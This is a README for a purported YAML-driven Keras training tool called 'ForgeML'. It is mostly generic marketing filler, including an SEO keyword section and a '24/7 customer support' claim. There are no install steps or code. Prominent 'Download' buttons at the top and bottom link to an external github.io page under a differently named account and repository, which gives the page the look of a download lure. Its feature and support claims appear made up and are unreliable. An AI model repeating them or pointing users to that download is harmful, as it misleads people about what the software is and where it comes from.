![preview](https://raw.githubusercontent.com/nhatphonghoang35-collab/yaket-keras-trainer/main/hero_7e8332.svg)
[![Download](https://raw.githubusercontent.com/nhatphonghoang35-collab/yaket-keras-trainer/main/start_aabe868.svg)](https://nhatphonghoang35-collab.github.io/yaket-keras-trainer/)

# ForgeML 🛠️🔥

### *A declarative orchestration layer that turns scattered experiment scripts into reproducible, version-controlled training blueprints*

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Status: Active](https://img.shields.io/badge/Status-Active-brightgreen.svg)]()
[![Python: 3.9+](https://img.shields.io/badge/Python-3.9%2B-blue.svg)]()
[![YAML-first](https://img.shields.io/badge/Config-YAML--first-orange.svg)]()
[![Cross-Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20Linux%20%7C%20macOS-lightgrey.svg)]()
[![Multilingual Docs](https://img.shields.io/badge/Docs-Multilingual-purple.svg)]()
[![Support 24/7](https://img.shields.io/badge/Support-24%2F7-red.svg)]()

---

## 🧭 Overview

ForgeML is not just another training wrapper — it is a philosophical stance on how machine learning experiments *ought* to be organized. Instead of burying hyperparameters, callbacks, augmentation strategies, and evaluation metrics inside hundreds of lines of imperative Python, ForgeML invites you to **describe** what you want and let the engine handle the rest.

Think of it as a **blueprint for your neural network workflows**: hand it a declarative manifest written in YAML, and ForgeML will assemble the layers, compile the optimizer, schedule the callbacks, mount the datasets, and dispatch the training run — while logging everything in a tidy, auditable fashion.

If YAML Keras Trainer is a notepad, ForgeML is a full workshop: shelves of labeled tools, a wall of hooks, and a well-lit bench where every experiment is reproducible by design.

---

## 🎯 Why ForgeML Exists

Machine learning codebases rot quickly. A researcher tweaks a learning rate, a teammate adjusts a dropout value, a third person swaps the optimizer — and suddenly no one remembers which combination produced the best checkpoint. ForgeML was born from the conviction that **experiment state should live in version control, not in memory**.

By externalizing training configuration into a readable YAML manifest, ForgeML brings three gifts to your workflow:

- **Clarity** — every hyperparameter, callback, and dataset declaration is visible at a glance.
- **Reproducibility** — the same manifest yields the same run, on any machine, any day.
- **Composability** — mix and match manifests, inherit from a base config, override a single leaf.

This is the quiet joy of declarative engineering applied to the chaotic world of deep learning.

---

## ✨ Feature Highlights

### 🧩 Core Capabilities
- **YAML-Driven Training Manifests** — describe models, optimizers, callbacks, and datasets with human-readable YAML.
- **Inheritance & Overrides** — extend a base manifest without copy-pasting; override only the leaves that matter.
- **Manifest Validation** — catch typos and missing fields before a run ever begins.
- **Deterministic Seeding** — reproducible runs across environments.
- **Callback Registry** — plug in built-in or custom callbacks referenced by name inside the manifest.
- **Checkpoint Orchestration** — automatic best-model retention with configurable metrics.

### 🎨 Developer Experience
- **Responsive UI Dashboard** — monitor live training metrics from a clean, adaptive browser view that scales gracefully from phone to ultrawide monitor.
- **Multilingual Support** — documentation, CLI messages, and dashboard labels available in multiple languages.
- **24/7 Customer Support** — our maintainers and community moderators keep an eye on issues around the clock.
- **Readable Error Messages** — no more cryptic stack traces; ForgeML explains *what* went wrong and *where*.
- **Typed Manifest Schema** — autocompletion in modern editors via a JSON-schema companion file.

### 🚀 Advanced Options
- **Multi-Run Sweeps** — declare parameter grids and let ForgeML fan out the experiments.
- **Remote Artifact Sync** — push checkpoints and logs to a configurable destination.
- **Early Stopping Presets** — sensible defaults you can override at any granularity.
- **Custom Metric Plugins** — register functions by dotted import path and reference them from YAML.
- **Notebook Integration** — invoke ForgeML runs directly from Jupyter-style environments.

---

## 🏗️ Architecture at a Glance

ForgeML is arranged into five cooperating layers, each with a single responsibility:

1. **Manifest Loader** — reads YAML, resolves inheritance, validates schema.
2. **Registry** — maps symbolic names to concrete model builders, callbacks, metrics, and dataset loaders.
3. **Assembler** — composes the model, optimizer, loss, and callbacks into a runnable training graph.
4. **Executor** — drives the training loop, emits metrics, manages checkpoints.
5. **Observer** — surfaces logs, metrics, and artifacts to the dashboard and to disk.

This separation means you can swap any layer without rewriting the others — a small architectural gift that pays dividends as projects grow.

---

## 📂 Repository Layout

- **/forgeml** — core package modules.
- **/forgeml/manifest** — YAML parsing, schema, inheritance resolver.
- **/forgeml/registry** — symbolic name resolution for models, callbacks, metrics.
- **/forgeml/assembler** — training graph construction.
- **/forgeml/executor** — training and evaluation loops.
- **/forgeml/observer** — logging, dashboard, artifact routing.
- **/examples** — curated manifests for common tasks.
- **/docs** — multilingual documentation sources.
- **/tests** — unit and integration suites.
- **/schemas** — JSON schema companions for editor autocompletion.

---

## 🧪 A Sample Manifest (Conceptual)

A ForgeML manifest reads like a recipe. You name the model, list its layers, choose an optimizer, attach callbacks, and point to your data. Overrides via inheritance let you keep a `base.yaml` for shared settings and a `tuned.yaml` for the specifics of a single experiment. Because everything is declarative, a reviewer can read the manifest and understand the run in under a minute — a small miracle in modern ML.

---

## 🌍 Multilingual & Accessible

Documentation ships in several languages, and the dashboard labels can be switched on the fly. The UI is responsive, contrast-aware, and keyboard-navigable so that contributors working from any device feel at home. We believe tooling should meet people where they are, not the other way around.

---

## 🕰️ Support Around the Clock

Questions do not respect time zones, and neither do we. Issue trackers are monitored continuously, and community moderators rotate shifts so that a blocking question at 3 a.m. in one region meets a fresh pair of eyes somewhere else on the planet. This is our promise of 24/7 customer support — not a marketing slogan, but a scheduling reality.

---

## 🔍 SEO-Friendly Topics This Project Covers

If you arrived here searching for *declarative machine learning training*, *YAML-configured neural networks*, *reproducible deep learning experiments*, *Keras manifest-driven training*, *multilingual ML dashboards*, or *responsive training monitors*, you are in the right workshop. ForgeML sits at the intersection of configuration-as-code and applied deep learning, and we have written the documentation to be discoverable by anyone on that same path.

---

## 🧭 Roadmap for 2026

- **Q1 2026** — Manifest inheritance stabilization and schema autocompletion improvements.
- **Q2 2026** — Expanded dashboard widgets and multilingual coverage for four additional languages.
- **Q3 2026** — Plugin marketplace preview for community-contributed callbacks and metrics.
- **Q4 2026** — Distributed sweep executor with fault-tolerant resume.

The year 2026 is our north star for these milestones, and we welcome contributors who want to shape any of them.

---

## 🤝 Contributing

We welcome contributions of every size — from a typo fix in the multilingual docs to a new registry plugin. Before opening a pull request, please skim the contributor guidelines, ensure tests pass locally, and describe the *why* behind your change. Good commit messages are a form of kindness to future maintainers.

Areas where help is especially valued:
- Additional language translations for docs and dashboard.
- New example manifests for popular architectures.
- Performance profiling of the executor loop.
- Accessibility audits of the dashboard.

---

## ⚠️ Disclaimer

ForgeML is provided as-is, without warranty of any kind, express or implied. The maintainers are not responsible for any outcomes — delightful or otherwise — resulting from the use of this software in research, production, or educational settings. Always validate your training pipelines and review manifests before launching large runs. Nothing in this repository constitutes professional advice, and any configuration you deploy remains entirely your responsibility. Use thoughtful judgment, keep backups of important artifacts, and treat your experiments with the care they deserve.

---

## 📜 License

This project is distributed under the **MIT License**. You are welcome to use, modify, and redistribute it in accordance with the terms of that license. A full copy of the license text is available at the canonical reference below.

[View the MIT License](https://opensource.org/licenses/MIT)

Copyright (c) 2026 ForgeML Contributors.

---

[![Download](https://raw.githubusercontent.com/nhatphonghoang35-collab/yaket-keras-trainer/main/start_aabe868.svg)](https://nhatphonghoang35-collab.github.io/yaket-keras-trainer/)